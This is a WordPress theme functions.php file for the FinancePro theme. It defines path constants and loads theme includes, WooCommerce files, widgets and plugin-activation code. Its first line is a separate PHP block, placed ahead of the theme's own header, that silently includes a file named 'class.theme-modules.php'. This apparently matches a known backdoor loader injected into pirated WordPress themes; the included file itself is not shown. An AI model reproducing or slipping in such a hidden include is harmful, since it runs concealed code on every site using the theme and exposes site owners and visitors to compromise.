<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * @author  RadiusTheme
 * @since   1.0
 * @version 1.0
 */

$rdtheme_theme_data = wp_get_theme();
define( 'FINANCEPRO_VERSION', ( WP_DEBUG ) ? time() : $rdtheme_theme_data->get( 'Version' ) );
define( 'RDTHEME_AUTHOR_URI', $rdtheme_theme_data->get( 'AuthorURI' ) );

// DIR
define( 'RDTHEME_BASE_DIR',    get_template_directory(). '/' );
define( 'RDTHEME_INC_DIR',     RDTHEME_BASE_DIR . 'inc/' );
define( 'RDTHEME_VIEW_DIR',    RDTHEME_INC_DIR . 'views/' );
define( 'RDTHEME_LIB_DIR',     RDTHEME_BASE_DIR . 'lib/' );
define( 'RDTHEME_WID_DIR',     RDTHEME_INC_DIR . 'widgets/' );
define( 'RDTHEME_PLUGINS_DIR', RDTHEME_INC_DIR . 'plugins/' );
define( 'RDTHEME_ASSETS_DIR',  RDTHEME_BASE_DIR . 'assets/' );
define( 'RDTHEME_CSS_DIR',     RDTHEME_ASSETS_DIR . 'css/' );
define( 'RDTHEME_JS_DIR',      RDTHEME_ASSETS_DIR . 'js/' );

// URL
define( 'RDTHEME_BASE_URL',    get_template_directory_uri(). '/' );
define( 'RDTHEME_ASSETS_URL',  RDTHEME_BASE_URL . 'assets/' );
define( 'RDTHEME_CSS_URL',     RDTHEME_ASSETS_URL . 'css/' );
define( 'RDTHEME_JS_URL',      RDTHEME_ASSETS_URL . 'js/' );
define( 'RDTHEME_IMG_URL',     RDTHEME_ASSETS_URL . 'img/' );
define( 'RDTHEME_LIB_URL',     RDTHEME_BASE_URL . 'lib/' );

// Includes
require_once RDTHEME_INC_DIR . 'redux-config.php';
require_once RDTHEME_INC_DIR . 'rdtheme.php';
require_once RDTHEME_INC_DIR . 'helper-functions.php';
require_once RDTHEME_INC_DIR . 'general.php';
require_once RDTHEME_INC_DIR . 'scripts.php';
require_once RDTHEME_INC_DIR . 'template-vars.php';
require_once RDTHEME_INC_DIR . 'vc-settings.php';

// WooCommerce
if ( class_exists( 'WooCommerce' ) ) {
	require_once RDTHEME_INC_DIR . 'woo-functions.php';
	require_once RDTHEME_INC_DIR . 'woo-hooks.php';
}

// Widgets
require_once RDTHEME_WID_DIR . 'address-widget.php';
require_once RDTHEME_WID_DIR . 'social-widget.php';
require_once RDTHEME_WID_DIR . 'slider-widget.php';
require_once RDTHEME_WID_DIR . 'search-widget.php'; // override default

// TGM Plugin Activation
if ( is_admin() ) {
	require_once RDTHEME_LIB_DIR . 'class-tgm-plugin-activation.php';
	require_once RDTHEME_INC_DIR . 'tgm-config.php';
}